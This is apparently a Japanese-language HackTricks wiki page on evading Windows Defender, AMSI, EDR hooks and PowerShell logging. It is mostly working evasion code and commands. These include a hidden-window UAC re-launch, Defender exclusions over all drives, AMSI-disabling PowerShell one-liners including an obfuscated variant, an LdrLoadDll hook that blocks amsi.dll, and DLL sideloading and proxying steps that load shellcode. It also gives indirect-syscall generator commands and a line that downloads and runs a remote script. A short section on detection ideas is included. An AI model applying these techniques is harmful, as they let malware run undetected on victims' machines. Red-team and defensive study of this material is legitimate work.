# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページの初版は** [**@m2rc_p**](https://twitter.com/m2rc_p)**が執筆しました！**

## Defenderを停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVになりすましてWindows Defenderの動作を停止するツール。
- [管理者権限がある場合にDefenderを無効化する](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前に、インストーラーを装ってUACを誘導する

ゲームチートを装う公開ローダーは、署名のないNode.js/Nexeインストーラーとして配布されることが多く、最初に**ユーザーに権限昇格を求めてから**Defenderを無力化します。手順はシンプルです。

1. `net session`を使って管理者権限の有無を確認します。このコマンドは呼び出し元が管理者権限を持つ場合にのみ成功するため、失敗した場合はローダーが標準ユーザーとして実行されていることを示します。
2. 元のコマンドラインを維持したまま、`RunAs`動詞を指定して自身をただちに再起動し、想定どおりUACの同意プロンプトを表示させます。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

被害者はすでに「クラック版」ソフトウェアをインストールしていると信じているため、通常はプロンプトを承認し、マルウェアに Defender のポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する包括的な `MpPreference` 除外設定

昇格後、GachiLoader 型の一連の処理は、サービスを完全に無効化するのではなく、Defender の検知の隙を最大限に広げます。ローダーはまず GUI の監視プロセス（`taskkill /F /IM SecHealthUI.exe`）を終了させ、続いて**極めて広範な除外設定**を追加し、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン対象外にします。

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

主な観察事項:

- ループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、ディスク上のどこに今後 payload が置かれても無視されます。
- `.sys` 拡張子の除外は、将来的に攻撃者がDefenderに再度触れることなく、未署名ドライバーを読み込めるようにするためのものです。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` に保存されるため、後続の段階で、UACを再度トリガーすることなく除外設定が維持されているかを確認したり、追加したりできます。

Defenderのサービスは停止されないため、単純なヘルスチェックでは「antivirus active」と報告され続けますが、実際にはリアルタイム検査がこれらのパスをチェックしなくなっています。<sup>[[26]](#references)</sup>

## **AV Evasionの方法論**

現在、AVはファイルが悪意のあるものかどうかを判定するために、静的検知、動的解析、さらに高度なEDRでは振る舞い分析など、さまざまな方法を使用しています。

### **静的検知**

静的検知では、バイナリやスクリプト内にある既知の悪意ある文字列やバイト配列を検出し、ファイル自体から情報（例: ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出します。そのため、既知の公開ツールを使うと検出されやすくなります。すでに解析され、悪意のあるものとしてフラグ付けされている可能性が高いためです。この種の検知を回避する方法はいくつかあります。

- **暗号化**

バイナリを暗号化すれば、AVがプログラムを検出する方法はなくなりますが、プログラムを復号してメモリ上で実行するための何らかのloaderが必要になります。

- **難読化**

バイナリやスクリプト内の文字列をいくつか変更するだけでAVをすり抜けられることもありますが、難読化の対象によっては時間のかかる作業になります。

- **独自ツールの開発**

独自のツールを開発すれば、既知の悪意あるシグネチャは存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defenderの静的検知を確認するには、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)がおすすめです。ファイルを複数のセグメントに分割し、各セグメントをDefenderに個別にスキャンさせます。これにより、バイナリ内でフラグ付けされた文字列やバイトを正確に特定できます。

実践的なAV Evasionに関するこの[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)もぜひご覧ください。

### 静的分類器向けのオフラインPE特徴テスト

パックまたは暗号化されたpayloadのバイト列は、静的分類器が使用する入力の一つにすぎません。EMBER2024は、import、export、セクション、ヘッダー、AuthenticodeデータなどのPE特徴を抽出します。<sup>[[48]](#references)</sup> あるloaderの実験では、無害に見えるimportを141個追加するとEMBER2024の悪意スコアが93%低下し、マルウェアと関連付けられたimportを追加するとスコアが上昇しました。これはそのモデルとサンプルにおける結果であり、特定のAV/EDR製品を確実に回避できる方法ではありません。<sup>[[50]](#references)</sup>

許可されたloaderのテストでは、payloadと実行経路を一定に保ち、各variantで変更するビルド変数は一つだけにして、スコアをオフラインで比較してください。ビルドの変更が複数の特徴グループに影響する可能性があるため、生成されたPE特徴を確認してください。<sup>[[49]](#references)[[50]](#references)</sup> 意図したimportをIATに保持するには、選択したWin32 APIを到達可能なコードから呼び出します。選択内容を変え、呼び出し箇所を複数のビルドに分散させてください。固定のカモフラージュ関数を作ると、シグネチャになる可能性があります。この実験では、有効なコード署名、exportエントリ、`.pdata`を大きくする関数の追加でもスコアが低下したと報告されています。無効な署名の影響は小さく、`.pdata`の影響もわずかでした。<sup>[[50]](#references)</sup>

`thrember`パッケージは特徴抽出とベンチマークモデルを提供します。インストール後、既存の`models`ディレクトリを使って`thrember.download_models("models")`を実行し、その後、親ディレクトリからスコア計算を実行してください。ダウンロード用ヘルパーは現在の作業ディレクトリを変更します。PE分類器を使えば、ビルドをスキャンサービスに送信せずに、ビルドのディレクトリをスコアリングできます。<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

比較中は、モデルと feature-extractor のバージョンを固定してください。オフラインスコアが低下しても、それはこの classifier が変更された binary にどう反応するかを示すだけであり、behavioral analysis、emulation、またはベンダーが使用する別のモデルを回避できたことの証明にはなりません。<sup>[[49]](#references)[[50]](#references)</sup> [virtualized payloads における per-build polymorphism と outer-binary camouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable)については、別の実行モデルを参照してください。

### **動的解析**

動的解析とは、AV が sandbox 内で binary を実行し、悪意のある動作（例：browser のパスワードを復号して読み取ろうとする、LSASS の minidump を実行するなど）を監視することです。この対策は少し難しい場合がありますが、sandbox を回避するためにできることをいくつか紹介します。

- **実行前にスリープする** 実装方法によっては、AV の動的解析を回避する有効な方法になります。AV がファイルをスキャンできる時間は、ユーザーの作業を妨げないよう非常に短いため、長時間スリープさせると binary の解析を妨害できます。ただし、実装方法によっては、多くの AV の sandbox がスリープをスキップできるという問題があります。
- **マシンのリソースを確認する** 通常、sandbox で使えるリソースは非常に限られています（例：RAM が 2GB 未満）。そうでなければ、ユーザーのマシンの動作が遅くなる可能性があります。ここでは、たとえば CPU の温度やファンの回転数を確認するなど、工夫を凝らすこともできます。sandbox ではすべてが実装されているとは限りません。
- **マシン固有のチェック** 「contoso.local」ドメインに参加しているユーザーのワークステーションを標的にする場合、コンピューターのドメインを確認し、指定したものと一致するか判定できます。一致しなければ、プログラムを終了させることができます。

Microsoft Defender の Sandbox のコンピューター名は HAL9TH であることが分かっています。そのため、detonation の前に malware 内でコンピューター名を確認できます。名前が HAL9TH と一致すれば、Defender の sandbox 内にいるということなので、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox 対策に関する、[@mgeeky](https://twitter.com/mariuszbit) によるその他の有用なヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この投稿で前述したとおり、**public tools** はいずれ **検出される**ので、次のことを自問してください。

たとえば、LSASS を dump したい場合、**本当に mimikatz を使う必要がありますか**？ それとも、あまり知られていない別のプロジェクトで LSASS を dump できますか？

おそらく、後者が正解です。mimikatz を例にすると、AV や EDR に最も多く検出される malware のひとつ、あるいはその筆頭です。プロジェクト自体は非常に優れていますが、AV を回避するために使うのは悪夢のように困難です。達成したいことに応じて、代替手段を探してください。

> [!TIP]
> 回避のために payload を変更するときは、Defender の **automatic sample submission を無効にしてください**。また、長期的に回避を実現することが目的なら、**絶対に VIRUSTOTAL にアップロードしないでください**。特定の AV に payload が検出されるか確認したい場合は、VM にその AV をインストールし、automatic sample submission を無効にしてから、結果に納得できるまでそこでテストしてください。

## EXEs vs DLLs

可能な場合は常に、回避には **DLL の使用を優先してください**。私の経験では、DLL ファイルは通常 **検出・解析されにくい**ため、場合によっては検出を避ける非常に簡単な方法になります（もちろん、payload を DLL として実行する方法がある場合に限ります）。

この画像のように、Havoc の DLL Payload は antiscan.me で 4/26 の検出率ですが、EXE payload の検出率は 7/26 です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常の Havoc EXE payload と通常の Havoc DLL の antiscan.me での比較</p></figcaption></figure>

ここからは、DLL ファイルを使ってさらに stealthier にするためのテクニックを紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、victim application と悪意のある payload(s) を同じ場所に配置し、loader が使用する DLL の検索順序を利用します。

[ Siofra](https://github.com/Cybereason/siofra) と次の powershell script を使うと、DLL Sideloading の影響を受けやすいプログラムを確認できます：

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

このコマンドは、`"C:\Program Files\\"` 内にあるDLL hijackingの影響を受けるプログラムと、それらが読み込もうとするDLLファイルの一覧を出力します。

**DLL Hijackable/Sideloadable programsを自分で調べることを強くおすすめします**。適切に行えば、この手法はかなりステルス性が高いですが、公開されているDLL Sideloadable programsを使うと、簡単に見つかる可能性があります。

プログラムが読み込もうとする名前の悪意あるDLLを配置するだけでは、payloadは読み込まれません。プログラムはそのDLL内に特定の関数があることを想定しているためです。この問題を解決するために、**DLL Proxying/Forwarding**と呼ばれる別の手法を使います。

**DLL Proxying**では、プログラムがプロキシ（悪意ある）DLLに対して行う呼び出しを元のDLLに転送します。これにより、プログラムの機能を維持しながら、payloadの実行を処理できます。

[@flangvik](https://twitter.com/Flangvik/)のプロジェクト[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)を使用します。

以下が実施した手順です:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最後のコマンドにより、2つのファイルが生成されます。DLLのソースコードテンプレートと、名前を変更した元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

これらが結果です：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちのshellcode（[SGN](https://github.com/EgeBalci/sgn)でエンコード）とproxy DLLは、どちらも[antiscan.me](https://antiscan.me)で検出率0/26でした！成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについて詳しく学ぶには、[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と、[ippsecの動画](https://www.youtube.com/watch?v=3eROsG_WNpE)をぜひ視聴することを**強くおすすめします**。

### Forwarded Exportsの悪用（ForwardSideLoading）

Windows PEモジュールは、実際には「forwarder」である関数をエクスポートできます。コードを指す代わりに、エクスポートエントリには`TargetDll.TargetFunc`形式のASCII文字列が含まれます。呼び出し元がエクスポートを解決すると、Windowsローダーは次の処理を行います：

- `TargetDll`がまだ読み込まれていない場合、読み込む
- そこから`TargetFunc`を解決する

理解しておくべき主な動作：
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs名前空間（例：ntdll、kernelbase、ole32）から提供されます。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合、通常のDLL検索順序が使われます。これには、forward解決を行うモジュールのディレクトリも含まれます。

これにより、間接的なsideloadingの手法が可能になります。つまり、KnownDLLではないモジュール名に転送される関数をエクスポートする署名済みDLLを見つけ、その署名済みDLLと同じ場所に、転送先モジュールと完全に同じ名前を付けた攻撃者が制御するDLLを配置します。転送されたエクスポートが呼び出されると、ローダーはforwardを解決し、同じディレクトリからあなたのDLLを読み込んで、DllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例：

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーします。
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダーに悪意のある `NCRYPTPROV.dll` を配置します。`DllMain` は最小限の実装でコード実行できます。`DllMain` をトリガーするために、転送先の関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 署名済みの LOLBin で転送をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

観測された動作:
- rundll32（署名済み）が side-by-side の `keyiso.dll`（署名済み）を読み込む
- `KeyIsoSetAuditingInterface` の解決中、loader は転送先の `NCRYPTPROV.SetAuditingInterface` をたどる
- その後、loader は `C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合でも、「missing API」エラーが発生するのは `DllMain` の実行後

調査のヒント:
- 転送先の module が KnownDLL ではない転送 export に注目する。KnownDLL は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に記載されている
- 次のようなツールを使って転送 export を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を探すには、Windows 11 の forwarder inventory を参照してください: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検知/防御のアイデア:
- LOLBins（例: rundll32.exe）がシステム外のパスから署名済み DLL を読み込み、その後、同じディレクトリから同じ base name の非 KnownDLLs を読み込む動作を監視する
- 次のようなプロセス/モジュールの連鎖を検知する: `rundll32.exe` → システム外の `keyiso.dll` → ユーザーが書き込み可能なパスにある `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込みと実行を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze は、一時停止したプロセス、直接 syscall、代替実行方法を使用して EDR を回避するための payload toolkit です`

Freeze を使用すると、shellcode をステルス性の高い方法でロードして実行できます。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionはいたちごっこです。今日有効な手法も明日には検出される可能性があるため、1つのツールだけに頼らないでください。可能であれば、複数のEvasionテクニックを連鎖させてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRは、`ntdll.dll`のsyscall stubに**user-mode inline hook**を仕掛けることがよくあります。これらのhookを回避するには、正しい**SSN**（System Service Number）をロードし、hookされたexportのentrypointを実行せずにkernel modeへ遷移する、**direct**または**indirect** syscall stubを生成できます。<sup>[[32]](#references)</sup>

**呼び出しオプション:**
- **Direct (embedded)**: 生成されたstubに`syscall`/`sysenter`/`SVC #0`命令を出力する（`ntdll`のexportを通らない）。
- **Indirect**: `ntdll`内にある既存の`syscall` gadgetへジャンプし、kernelへの遷移が`ntdll`から発生したように見せる（heuristic evasionに有用）。**randomized indirect**では、呼び出しごとにpoolからgadgetを選択する。
- **Egg-hunt**: 静的な`0F 05` opcode sequenceをディスク上に埋め込まず、実行時にsyscall sequenceを解決する。

**Hookに強いSSN解決戦略:**
- **FreshyCalls (VA sort)**: stubのバイト列を読む代わりに、syscall stubをvirtual address順にソートしてSSNを推定する。
- **SyscallsFromDisk**: クリーンな`\KnownDlls\ntdll.dll`をmapし、その`.text`からSSNを読み取ってからunmapする（メモリ上のすべてのhookを回避する）。
- **RecycledGate**: VA順のソートによるSSN推定と、stubがクリーンな場合のopcode検証を組み合わせる。hookされている場合はVA推定にフォールバックする。
- **HW Breakpoint**: `syscall`命令にDR0を設定し、VEHを使って実行時に`EAX`からSSNを取得する。hookされたバイト列の解析は不要。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

クリーンな x64 `ntdll` の syscall export を解析して SSN を取得する場合は、`4C 8B D1 B8`（`mov r10, rcx; mov eax, imm32`）と、その前に `F3 0F 1E FA`（`endbr64`）が付くシーケンスの両方を許容してください。後者は CET プレフィックス付きの stub です。SSN が常に固定オフセットにあると仮定する parser では、これを見逃します。indirect-syscall の初期化に失敗して loader が `GetProcAddress` にフォールバックすると、これらの export 経由の呼び出しは再び user-mode hook に遭遇する可能性があります。<sup>[[54]](#references)</sup>

### `tprtdll.dll` 内の代替 syscall export

プロジェクトによると、`tprtdll.dll` は Microsoft 署名済み DLL であり、Windows 11 build 26100 以降の `C:\Windows\System32\` に存在します。`ntdll.dll` とは異なるコードアドレスを持つため、`ntdll` の syscall entrypoint だけにパッチを適用する hook では、対応する `tprtdll` stub にパッチは適用されません。上記の SSN 解決方法とは異なり、この方法では `tprtdll.dll` をロードし、利用可能な `Nt*` または `Zw*` export を `GetProcAddress` 経由で直接呼び出します。DLL と必要な export が存在することを確認し、適切な NT 関数プロトタイプを使用してください。<sup>[[55]](#references)</sup>

self-injection PoC では、`tprtdll!NtAllocateVirtualMemoryEx` を使って RW メモリを割り当て、`memcpy` でバイト列をコピーし、`tprtdll!ZwProtectVirtualMemory` で領域を RX に変更してから、`tprtdll!RtlCreateUserThread` で thread を開始します。<sup>[[56]](#references)</sup> cross-process 版では、アクセス可能な対象プロセスの handle が必要で、コピーには `WriteProcessMemory` を使います。<sup>[[57]](#references)</sup> プロジェクトの export 一覧には `NtOpenProcess`、`NtWriteVirtualMemory`、`NtCreateThreadEx` がないため、すべての injection 操作で代替 export を使えるわけではありません。<sup>[[55]](#references)</sup>

この PoC は、`RtlCreateUserThread` が direct syscall stub であることや、export を `tprtdll` から解決しただけで内部呼び出しが `ntdll` hook を回避できることを示していません。<sup>[[56]](#references)</sup> cross-process の例では、injector で解決した `WinExec` と `ExitThread` のアドレスも埋め込んでいます。例の payload を動作させるには、それらのアドレスが対象プロセス内でも有効である必要があります。<sup>[[57]](#references)</sup>

この方法で回避できるのは、対応する `ntdll` export のみに適用された hook です。syscall が kernel-level monitoring から隠れるわけではありません。<sup>[[55]](#references)</sup> remote write と新しい thread を使わない injection 方法については、[Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md) を参照してください。

## AMSI (Anti-Malware Scan Interface)

AMSI は「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。初期の AV は**ディスク上のファイル**しかスキャンできなかったため、payload を何らかの方法で**メモリ内で直接**実行できれば、AV は十分な可視性を持たず、それを防ぐことができませんでした。

AMSI 機能は、Windows の以下のコンポーネントに統合されています。

- User Account Control、つまり UAC（EXE、COM、MSI、または ActiveX のインストール時の昇格）
- PowerShell（script、対話的な使用、動的コード評価）
- Windows Script Host（wscript.exe と cscript.exe）
- JavaScript と VBScript
- Office VBA macro

これにより、script の内容を暗号化も難読化もされていない形式で公開し、antivirus solution が script の動作を検査できるようになります。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defender は以下の alert を表示します。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` の後に、script を実行した executable の path が付いていることに注目してください。この場合は powershell.exe です。

ディスクにはファイルを一切書き込みませんでしたが、AMSI によってメモリ内で検出されました。

さらに、**.NET 4.8** 以降では C# code も AMSI を通じて実行されます。これは、メモリ内で実行するための `Assembly.Load(byte[])` によるロードにも影響します。そのため、AMSI を回避してメモリ内で実行する場合は、より古いバージョンの .NET（4.7.2 以下など）の使用が推奨されます。

AMSI を回避する方法はいくつかあります。

- **Obfuscation**

AMSI は主に静的検出を行うため、ロードする script を変更することは、検出を回避する有効な方法になり得ます。

ただし、AMSI は複数の層がある場合でも script を deobfuscate できるため、方法によっては obfuscation が逆効果になることがあります。そのため、回避は簡単ではありません。一方で、変数名をいくつか変えるだけで済む場合もあるので、どの程度検出対象としてフラグが立てられているかによります。

- **AMSI Bypass**

AMSI は DLL を powershell（および cscript.exe、wscript.exe など）の process にロードして実装されているため、非特権ユーザーとして実行中でも簡単に改変できます。この AMSI 実装上の欠陥により、研究者たちは AMSI scanning を回避する複数の方法を発見しました。

**Forcing an Error**

AMSI の初期化を失敗させる（amsiInitFailed）と、現在の process では scan が開始されなくなります。これは当初 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、その後 Microsoft は広範な利用を防ぐための signature を開発しました。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

PowerShell codeを1行実行するだけで、現在のPowerShellプロセスでAMSIを使用不能にできます。もちろん、このコード自体がAMSIに検知されるため、この手法を使うには何らかの変更が必要です。

以下は、[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から引用した、改変済みのAMSI bypassです。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, この投稿が公開された後は検出される可能性が高いため、検出されずに済ませるつもりなら、コードを公開しないでください。

**Memory Patching**

この手法は当初 [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。amsi.dll 内の「AmsiScanBuffer」関数（ユーザーが入力した内容のスキャンを担当）のアドレスを見つけ、E_INVALIDARG のコードを返す命令で上書きします。これにより、実際のスキャン結果は 0 となり、クリーンな結果として解釈されます。

> [!TIP]
> 詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

AMSI を powershell でバイパスする手法はほかにも数多くあります。詳しくは[**このページ**](basic-powershell-for-pentesters/index.html#amsi-bypass)と[**この repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をご覧ください。

### `AmsiScanBuffer` のパッチではなく、AMSI COM の scan-pointer をリダイレクトする

別のプロセス内バイパスでは、`AmsiScanBuffer` のエントリポイントには手を加えません。報告された 64-bit .NET loader では、CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` から AMSI COM object を作成し、`Marshal.GetIUnknownForObject()` で interface pointer を取得します。その vtable のオフセット `0x18` にあるスロットを、スキャン呼び出しのターゲットとして使用します。loader は `Console.Clear()` の native pointer を小さな x64 stub で上書きし、`VirtualProtect()` の下でその vtable エントリを stub に変更してから、元のページ保護を復元します。前提条件として、ポインター幅が 64-bit であることと、想定される COM layout に一致することが必要です。これは任意の AMSI interface や build に使える汎用的なオフセットではありません。先に確認された段階には、[signed AppDomainManager sidecar loading](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) と [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml)があります。<sup>[[51]](#references)</sup>

確認された stub の byte は `41 C7 00 01 00 00 00 33 C0 C3` です。これは `r8` の result pointer に **1** を書き込み、`eax` に **0** を返します。したがって、スキャン結果が `AMSI_RESULT_CLEAN` (0) になるという報告の主張は、`S_OK` の戻り値と出力 enum を混同しています。文書化されている `AMSI_RESULT` の順序では、result **1** は `AMSI_RESULT_NOT_DETECTED` です。これは依然として検出しきい値を下回っています。<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll のロードを防いで AMSI をブロックする (LdrLoadDll hook)

AMSI は、現在のプロセスに `amsi.dll` がロードされた後にのみ初期化されます。堅牢で言語に依存しないバイパス方法は、`ntdll!LdrLoadDll` に user-mode hook を配置し、要求された module が `amsi.dll` の場合にエラーを返すことです。その結果、AMSI はロードされず、そのプロセスではスキャンも行われません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++ pseudocode）:
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
メモ
- PowerShell、WScript/CScript、カスタムローダーなど、AMSIを読み込むものなら幅広く動作します。
- スクリプトを標準入力経由で渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせると、コマンドラインに長い痕跡が残るのを避けられます。
- LOLBins経由で実行されるローダー（例: `regsvr32` が `DllRegisterServer` を呼び出すケース）での使用が確認されています。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** も、AMSIをバイパスするスクリプトを生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** も、ユーザー定義関数、変数、文字式をランダム化し、PowerShellキーワードの大文字・小文字もランダムにすることでシグネチャを回避し、AMSIをバイパスするスクリプトを生成します。

**検出されたシグネチャを削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などのツールを使うと、現在のプロセスのメモリから検出されたAMSIシグネチャを削除できます。このツールは、現在のプロセスのメモリをスキャンしてAMSIシグネチャを探し、NOP命令で上書きすることで、メモリから実質的に削除します。

**AMSIを使用するAV/EDR製品**

AMSIを使用するAV/EDR製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2を使う**
PowerShell version 2を使うとAMSIは読み込まれないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のようにします。

```bash
powershell.exe -version 2
```

## PowerShell Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドを記録できる機能です。監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題になることもあります**。

PowerShell logging を回避するには、次の手法を使用できます。

- **PowerShell Transcription と Module Logging を無効化する**: 目的に応じて、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) などのツールを使用できます。
- **PowerShell version 2 を使用する**: PowerShell version 2 を使用すると AMSI がロードされないため、AMSI にスキャンされずにスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
